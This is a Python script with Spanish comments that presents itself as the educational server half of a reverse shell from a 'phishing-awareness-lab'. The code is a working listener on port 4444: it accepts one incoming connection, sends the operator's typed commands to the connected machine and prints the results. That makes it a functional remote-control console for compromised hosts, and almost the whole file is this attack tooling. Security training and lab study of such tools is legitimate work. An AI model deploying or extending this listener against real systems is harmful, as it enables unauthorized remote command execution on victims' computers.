#!/usr/bin/env python3
"""
servidor.py — Lado servidor de una reverse shell (USO EDUCATIVO).

Parte de "phishing-awareness-lab". Escrito para entender cómo funciona el
modelo cliente/servidor de una conexión remota. Ejecutar SOLO en equipos
propios y entornos de laboratorio aislados. Usarlo contra sistemas sin
autorización explícita es ilegal.

Reemplaza los valores de configuración; no hay IPs reales en este archivo.
"""
import socket

HOST = "0.0.0.0"   # escucha en todas las interfaces del equipo de lab
PORT = 4444        # puerto de escucha


def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(1)
    print(f"[*] Servidor escuchando en el puerto {PORT}. Esperando conexion...")

    conn, addr = server.accept()
    print(f"[+] Conexion establecida desde: {addr[0]}:{addr[1]}")
    print("[+] Escribe 'salir' para terminar.\n")

    try:
        while True:
            cmd = input("Shell> ")
            if not cmd.strip():
                continue
            if cmd.strip().lower() == "salir":
                break
            conn.sendall(cmd.encode())
            data = conn.recv(65535)
            if not data:
                break
            print(data.decode(errors="replace"))
    finally:
        conn.close()
        server.close()


if __name__ == "__main__":
    main()
